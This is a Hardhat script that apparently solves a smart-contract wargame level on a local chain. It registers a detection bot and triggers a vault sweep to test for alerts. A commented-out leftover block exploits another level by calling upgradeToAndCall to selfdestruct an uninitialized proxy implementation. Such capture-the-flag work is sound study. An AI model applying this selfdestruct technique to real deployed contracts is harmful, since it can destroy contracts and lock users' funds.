/*

*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player, deployer,user] = await ethers.getSigners();

  //Fund the player account - Run it only if is the first time this script is executed on the local blockchain!
  await user.sendTransaction({
    to: player.address,
    value: ethers.utils.parseEther("50.0"), // Sends exactly 50.0 ether
  });

  let tx;
  let txReceipt;

  // Deploy Factory Contract
  const DoubleEntryPointFactory = await hre.ethers.getContractFactory("DoubleEntryPointFactory");
  this.doubleEntryPointFactory = await DoubleEntryPointFactory.connect(deployer).deploy({gasLimit: 30000000});
  await this.doubleEntryPointFactory.deployed();

  // Deploy all the contracts needed for the DoubleEntryPoint level using the DoubleEntryPointFactory contract
  tx = await this.doubleEntryPointFactory.connect(deployer).createInstance(player.address,{value: 0});
  await tx.wait()

  const DET_Token = await this.doubleEntryPointFactory.DET_Token();  // DET_Token Contract address / Underlying Token on the Vault contract

  // Creating an instance of the DET token (Double Entry Token contract) 
  this.detToken = await hre.ethers.getContractAt("DoubleEntryPoint",DET_Token);

  /*
  address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

  */

  const FORTA_CONTRACT_ADDRESS = await this.detToken.forta()
  const LEGACY_TOKEN_CONTRACT_ADDRESS = await this.detToken.delegatedFrom();
  const DET_TOKEN_CONTRACT_ADDRESS = await this.detToken.address;
  const CRYPTO_VAULT_ADDRESS = await this.detToken.cryptoVault()

  console.log("Creating an instance to point to the CryptoVault contract");
  this.cryptoVaultContract = await hre.ethers.getContractAt("CryptoVault",CRYPTO_VAULT_ADDRESS);

  console.log("Creating an instance to point to the Forta contract");
  this.fortaContract = await hre.ethers.getContractAt("Forta",FORTA_CONTRACT_ADDRESS);

  // Deploying the DetectionBot contract
  console.log("Deploying the DetectionBot");
  const DetectionBot = await hre.ethers.getContractFactory("DetectionBot");
  this.detectionBot = await DetectionBot.connect(player).deploy(FORTA_CONTRACT_ADDRESS,LEGACY_TOKEN_CONTRACT_ADDRESS,DET_TOKEN_CONTRACT_ADDRESS,CRYPTO_VAULT_ADDRESS);
  await this.detectionBot.deployed();

  const DETECTIONBOT_ADDRESS = this.detectionBot.address;
  
  console.log("Registering the DetectionBot on the Forta contract");
  tx = await this.fortaContract.connect(player).setDetectionBot(DETECTIONBOT_ADDRESS);
  await tx.wait();
  
  console.log(
    `
    DET_Token ${DET_Token} \n
    cryptoVault ${CRYPTO_VAULT_ADDRESS} \n
    player ${await this.detToken.player()} \n
    delegatedFrom ${await this.detToken.delegatedFrom()} \n
    forta ${FORTA_CONTRACT_ADDRESS} \n

    ==================================== \n
    underlying token address on the CryptoVault contract: ${await this.cryptoVaultContract.underlying()}
    
    ==================================== \n
    DetectionBot address: ${await this.detectionBot.address} \n
    forta contract address set on the DetectionBot ${await this.detectionBot.fortaContract()} \n    

    ==================================== \n
    usersDetectionBots on the FortaContract: ${await this.fortaContract.usersDetectionBots(player.address)}
    `
    );
    
    // Validating setups!
    expect(await this.detectionBot.fortaContract()).to.eq(FORTA_CONTRACT_ADDRESS)
    expect(await this.detectionBot.LegacyToken()).to.eq(LEGACY_TOKEN_CONTRACT_ADDRESS)
    expect(await this.detectionBot.DET_Token()).to.eq(DET_TOKEN_CONTRACT_ADDRESS)
    expect(await this.detectionBot.CryptoVaultContract()).to.eq(CRYPTO_VAULT_ADDRESS);
    expect(await this.fortaContract.usersDetectionBots(player.address)).to.eq(DETECTIONBOT_ADDRESS);
    expect(await this.cryptoVaultContract.underlying()).to.eq(DET_Token)
  
  console.log("\n\n Performing attack ... \n\n");

  

        // initializer() can't be called directly from an EOA //
  // console.log("Calling initializer() directly from the Player's account!");
  // tx = await this.engineContractProxyInstance.connect(player).initialize();
  // txReceipt = await tx.wait();
  // console.log(txReceipt);

  console.log("Alerts on the DetectionBot BEFORE attempting to sweep() the Legacy token from the Vault contract: ", await this.fortaContract.botRaisedAlerts(DETECTIONBOT_ADDRESS));
  
  // console.log("Calling the sweepToken() of the CryptoVault and passing the address of the LegacyToken as the parameter");
  tx = await this.cryptoVaultContract.connect(player).sweepToken(LEGACY_TOKEN_CONTRACT_ADDRESS, {gasLimit: 30000000});
  await tx.wait();

  console.log("Alerts on the DetectionBot AFTER attempting to sweep() the Legacy token from the Vault contract: ", await this.fortaContract.botRaisedAlerts(DETECTIONBOT_ADDRESS));
  
  /*
  console.log(
    `
    MotorbikeContractAddress ${MotorbikeContractAddress} \n
    EngineContractAddress ${EngineContractAddress} \n\n

    StorageAt slot0 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,0)}
    StorageAt slot1 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,1)}
    
    StorageAt slot0 on the Engine contract: ${await hre.ethers.provider.getStorageAt(EngineContractAddress,0)}
    `
  );
 
    
  console.log("Checking the upgrader variable was set as the Player's address");
  console.log("upgrader on the Engine contract: ", await this.engineContract.upgrader());
  console.log("upgrader on the Proxy contract: ", await this.engineContractProxyInstance.upgrader());
  //txReceipt = await tx.wait();
  // console.log(txReceipt);

  console.log("Deploying the Attack contract");
  const AttackMotorbike = await hre.ethers.getContractFactory("AttackMotorbike");
  this.attackMotorbike = await AttackMotorbike.connect(player).deploy();
  await this.attackMotorbike.deployed();

  const iface = new hre.ethers.utils.Interface([
    "function destroyContract()"
  ]);

  // Encoding the data that will be sent on the upgradeToAndCall
  const destroyContractEncoded = iface.encodeFunctionData("destroyContract",[]);
  
  console.log("Selfdestructing the Engine contract");
  tx = await this.engineContract.connect(player).upgradeToAndCall(this.attackMotorbike.address,destroyContractEncoded);
  txReceipt = await tx.wait();
  // console.log(txReceipt);

  console.log("Was the Engine contract destructed?");
  tx = await this.attackMotorbike.connect(player).contractExists(EngineContractAddress);
  await tx.wait()

  console.log(await this.attackMotorbike.destroyed());
  expect(await this.attackMotorbike.destroyed()).to.eq(true);
  

  */
  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});